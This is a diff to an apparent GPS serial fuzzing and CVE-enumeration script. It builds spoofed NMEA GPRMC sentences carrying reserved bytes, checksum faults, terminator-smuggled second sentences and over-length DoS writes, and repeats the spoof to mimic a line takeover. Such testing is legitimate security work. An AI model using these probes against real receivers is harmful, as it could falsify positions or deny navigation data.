@@ -139,10 +139,15 @@ def build_probes(overlen_lengths):
     add("cks_one_digit", "6 invalid checksum", "STRONG",
         lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(SPOOF_RMC_BODY)[0] + "\r\n").encode())
 
-    # 3) RESERVED / CONTROL bytes in a data field (checksum kept VALID -> only anomaly is the byte)
+    # 3) RESERVED / CONTROL bytes in a data field (checksum kept VALID -> only anomaly is the
+    #    byte). The char goes in the TIME field ("1200<ch>00.00") so the lat/lon/hemisphere
+    #    fields stay intact -- if the unit accepts the sentence anyway, the spoof position shows.
+    #    (Putting it in the hemisphere field would just corrupt the position and always reject,
+    #    testing "broken field" instead of "reserved char in an otherwise-valid field".)
     for tag, ch in (("dollar", b"$"), ("bang", b"!"), ("star", b"*"), ("caret", b"^"),
                     ("tilde", b"\x7e"), ("del", b"\x7f"), ("nul", b"\x00"), ("cr", b"\r")):
-        body = b"GPRMC,120000.00,A," + SPOOF_LAT_F.encode() + b"," + ch + b"N,07130.0000,W,0.0,90.0,180626,,,A"
+        body = (b"GPRMC,1200" + ch + b"00.00,A," + SPOOF_LAT_F.encode() + b",N,"
+                + SPOOF_LON_F.encode() + b",W,0.0,90.0,180626,,,A")
         add(f"reserved_{tag}", "3 reserved byte", "MODERATE", (lambda body=body: ok_body_bytes(body)))
 
     # 4/5) TERMINATOR SMUGGLING: first sentence spoof, smuggled 2nd sentence at SMUGGLE posn
@@ -199,6 +204,12 @@ def main():
     ap = argparse.ArgumentParser(description="Serial CVE-enumeration suite (continuous-baseline model).")
     ap.add_argument("--gps-port"); ap.add_argument("--gps-baud", type=int, default=4800)
     ap.add_argument("--gap", type=float, default=50.0, help="baseline recovery seconds after each probe (>= reacquisition)")
+    ap.add_argument("--accept-dwell", type=float, default=6.0,
+                    help="for non-DoS probes, seconds to REPEAT the malformed sentence at the GPS "
+                         "rate (a real line-takeover sends the spoof continuously). A single "
+                         "sentence 1.5 deg off can be filtered as an outlier, so acceptance is "
+                         "only trustworthy when the spoof is offered repeatedly. DoS/overlength "
+                         "probes stay single-write (their effect is the write-time suppression).")
     ap.add_argument("--reacq", type=float, default=30.0, help="extra recovery to add on top of an over-length write time")
     ap.add_argument("--settle", type=float, default=90.0, help="initial baseline settle")
     ap.add_argument("--overlen-lengths", type=int, nargs="+",
@@ -252,8 +263,20 @@ def main():
                 predicted_s=round(pred, 3), sent_len=len(raw),
                 sample=raw[:120].decode("latin-1").replace("\x00", "\\0"))
             print(f"[{i+1}/{len(probes)}] {p['id']} ({p['cve']}) pred_dos={pred:.1f}s")
-            t0 = time.time(); ser.write(raw); ser.flush(); write_s = time.time() - t0
-            rec(event="probe_end", id=p["id"], write_s=round(write_s, 3))
+            t0 = time.time()
+            if p["overlen"]:
+                # DoS probe: a SINGLE write -- the effect under test is the write-time monopoly.
+                ser.write(raw); ser.flush()
+                reps = 1
+            else:
+                # acceptance/parser/semantic probe: REPEAT the malformed spoof at ~1/s for the
+                # dwell, so a genuine acceptance shows up reliably (not filtered as a lone outlier)
+                # and a rejection is confirmed by the baseline holding across many repeats.
+                reps = 0; end = t0 + args.accept_dwell
+                while time.time() < end:
+                    ser.write(raw); ser.flush(); reps += 1; time.sleep(1.0)
+            write_s = time.time() - t0
+            rec(event="probe_end", id=p["id"], write_s=round(write_s, 3), reps=reps)
             hold_baseline(ser, max(args.gap, pred + args.reacq))   # recovery >= reacquisition and write time
     except KeyboardInterrupt:
         print("\ninterrupted."); rec(event="interrupted")
